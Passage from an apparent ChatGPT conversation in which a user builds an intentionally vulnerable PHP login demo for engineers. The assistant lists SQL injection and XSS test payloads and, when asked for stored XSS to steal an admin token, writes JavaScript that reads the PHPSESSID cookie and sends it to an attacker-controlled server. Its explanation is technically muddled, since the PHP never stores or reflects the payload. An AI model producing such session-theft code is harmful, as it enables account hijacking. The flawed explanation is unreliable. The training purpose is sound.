

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Login</title>
</head>
<body>
    <form id="loginForm">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <button type="button" onclick="submitLogin()">Login</button>
    </form>

    <div id="result"></div>

    <script>
        function submitLogin() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        document.getElementById('result').innerHTML = xhr.responseText;
                    } else {
                        document.getElementById('result').innerHTML = 'Error: ' + xhr.status;
                    }
                }
            };
            
            xhr.open('POST', 'process_login.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
        }
    </script>
</body>
</html>

```
Create a PHP script to process the login (process_login.php):


```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Simulate user authentication (In a real-world scenario, use proper authentication mechanisms)
    if ($username === 'admin' && $password === 'password') {
        echo "Login successful. Welcome, $username!";
    } else {
        echo "Login failed. Invalid credentials.";
    }
}
?>
```

In this example, the login form sends a POST request to the server with the entered username and password. 
The server checks if the credentials match a hardcoded set (for simplicity; in a real-world scenario, you would use proper authentication mechanisms).

You can demonstrate potential vulnerabilities by manipulating the credentials in the payload. 
For example, if the server doesn't properly validate and sanitize input, an attacker might try sending malicious payloads, such as SQL injection or other types of injection attacks.

Encourage your engineers to test the application with payloads like:

Valid credentials: admin and password.
SQL injection payload: admin' OR '1'='1' -- (to see if it bypasses authentication).
XSS payload: <script>alert('XSS')</script> (to see if it executes JavaScript).
This example is intentionally vulnerable for educational purposes. In a real-world scenario, always implement proper input validation, parameterized queries, and secure authentication mechanisms to prevent security vulnerabilities.



User
ok but how would this turn into a stored XSS that we could use to demonstrate getting the admin token through XHR fetch?
ChatGPT
To turn the example into a stored XSS vulnerability that could potentially be used to steal an admin token through XHR fetch, you can modify the PHP script (process_login.php) to store the user's session token in a way that makes it accessible to attackers. Please note that these modifications are for educational purposes only, and you should never implement such vulnerabilities in a production environment.

Here's a modified version of process_login.php to illustrate a stored XSS vulnerability:

```
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Simulate user authentication (In a real-world scenario, use proper authentication mechanisms)
    if ($username === 'admin' && $password === 'password') {
        $token = generateRandomToken();  // Generate a random token for the user
        $_SESSION['token'] = $token;     // Store the token in the session
        echo "Login successful. Welcome, $username!";
    } else {
        echo "Login failed. Invalid credentials.";
    }
}

function generateRandomToken() {
    return bin2hex(random_bytes(32));  // Generate a random 64-character token
}
?>
```
In this modified script, when the admin logs in successfully, 
a random token is generated and stored in the $_SESSION['token']. This token simulates an authentication token or session identifier.

Now, let's modify the JavaScript in index.html to perform a malicious action when a user submits the login form:

```
<script>
    function submitLogin() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                if (xhr.status == 200) {
                    document.getElementById('result').innerHTML = xhr.responseText;
                } else {
                    document.getElementById('result').innerHTML = 'Error: ' + xhr.status;
                }
            }
        };

        // Injecting malicious payload to steal the admin token
        xhr.open('POST', 'process_login.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) +
                 '&maliciousPayload=<img src=x onerror="stealToken()">');
    }

    // Malicious function to steal the admin token
    function stealToken() {
        var token = document.cookie.match(/PHPSESSID=([^;]+)/);
        alert('Admin Token Stolen!\nToken: ' + token[1]);
        // Send the stolen token to an attacker-controlled server using XHR fetch
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://attacker-controlled-server.com/steal.php?token=' + token[1], true);
        xhr.send();
    }
</script>

```



